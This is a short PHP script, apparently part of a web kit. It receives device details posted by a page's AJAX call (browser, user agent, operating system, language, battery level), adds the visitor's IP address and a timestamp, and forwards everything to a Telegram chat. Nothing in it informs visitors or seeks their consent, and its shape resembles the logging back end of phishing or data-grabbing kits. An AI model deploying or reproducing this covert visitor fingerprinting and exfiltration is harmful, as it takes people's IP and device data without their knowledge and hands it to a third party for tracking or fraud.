<?php
// Incluye configuración y funciones de Telegram
require_once __DIR__ . '/config.php';
require_once __DIR__ . '/ip_utils.php';
require_once __DIR__ . '/telegram.php';

// Recibir datos enviados por AJAX
$agent = $_POST['agent'] ?? 'Unknown';
$navegador = $_POST['navegador'] ?? 'Unknown';
$versionapp = $_POST['versionapp'] ?? 'Unknown';
$dystro = $_POST['dystro'] ?? 'Unknown';
$idioma = $_POST['idioma'] ?? 'Unknown';
$bateri = $_POST['bateri'] ?? 'Unknown';

// IP del visitante
$ip = get_client_ip();
$ts = gmdate('c');

// Construir mensaje para Telegram
$msg = "📱 <b>Info del dispositivo</b>\n".
       "📌 IP: $ip\n".
       "🖥 Navegador: $navegador\n".
       "🧩 User-Agent: $agent\n".
       "💻 Versión App: $versionapp\n".
       "🖲 Sistema: $dystro\n".
       "🌐 Idioma: $idioma\n".
       "🔋 Batería: $bateri%\n".
       "⏰ Hora: $ts";

// Enviar mensaje a Telegram
send_to_telegram($msg);

// Responder JSON al AJAX
echo json_encode(['status' => 'ok']);
